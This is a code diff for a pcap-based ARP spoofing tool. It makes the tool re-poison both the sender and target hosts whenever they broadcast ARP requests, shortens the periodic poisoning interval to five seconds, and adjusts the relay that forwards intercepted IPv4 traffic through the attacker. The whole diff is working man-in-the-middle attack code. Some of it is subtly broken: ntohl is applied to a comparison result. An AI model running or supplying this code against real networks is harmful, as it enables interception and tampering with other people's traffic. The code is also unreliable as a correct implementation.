@@ -6,7 +6,8 @@ void ARPInfectDetectPacket(
     Ip& attacker_ip,
     Mac& sender_mac,
     Ip& sender_ip,
-    Ip& target_ip)
+    Ip& target_ip,
+    Mac& target_mac)
 {
     // sender ARP infect 
     sendARPPacket(
@@ -25,20 +26,25 @@ void ARPInfectDetectPacket(
     // 1. sender
     while (true)
     {   
-        cout<<"send arp-infect when detect\n";
         struct pcap_pkthdr* header;
 		const u_char* packet;
 		int res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
         EthArpPacket* captured_packet = (EthArpPacket*) packet;
         // find broadcast packet of gateway or sender, infect again
-        if(captured_packet->eth_.type() == EthHdr::Arp && captured_packet->arp_.op() == ArpHdr::Request && captured_packet->arp_.sip() == sender_ip && captured_packet->arp_.tmac() == arp_unknown && captured_packet->arp_.tip() == target_ip){
-            sleep(1000);
+        if(captured_packet->eth_.type() == EthHdr::Arp &&
+            captured_packet->arp_.op() == ArpHdr::Request &&
+            captured_packet->arp_.sip() == sender_ip &&
+            captured_packet->arp_.tmac() == arp_unknown &&
+            captured_packet->arp_.tip() == target_ip){
+            cout<<"send arp-infect when detect 1\n";
+            sleep(1);
             sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
         }
         else if(captured_packet->eth_.type() == EthHdr::Arp && captured_packet->arp_.op() == ArpHdr::Request && captured_packet->arp_.sip() == target_ip && captured_packet->arp_.tmac() == arp_unknown && captured_packet->arp_.tip() == sender_ip){
-            sleep(1000);
-            sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
+            cout<<"send arp-infect when detect 2\n";
+            sleep(1);
+            sendARPPacket(handle, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, false);
         }
     }
 }
@@ -53,7 +59,7 @@ void ARPInfectFrequent(
 {
     while(true){
         cout<<"send arp-infect when frequent\n";
-        sleep(1000*60*5);
+        sleep(5);
         sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
     }
 }
@@ -82,7 +88,7 @@ void ARPRelay(
         if (captured_packet->type_ == EthHdr::Ip4) {
             struct IPv4Hdr* ipv4_hdr = (struct IPv4Hdr*)(packet + sizeof(EthHdr));
             
-            if (ntohl(ipv4_hdr->ip_dst == target_ip)) {
+            if (ntohl(ipv4_hdr->ip_src == sender_ip)) {
                 cout << "Relaying..\n";
                 captured_packet->smac_ = attacker_mac;
                 captured_packet->dmac_ = target_mac;
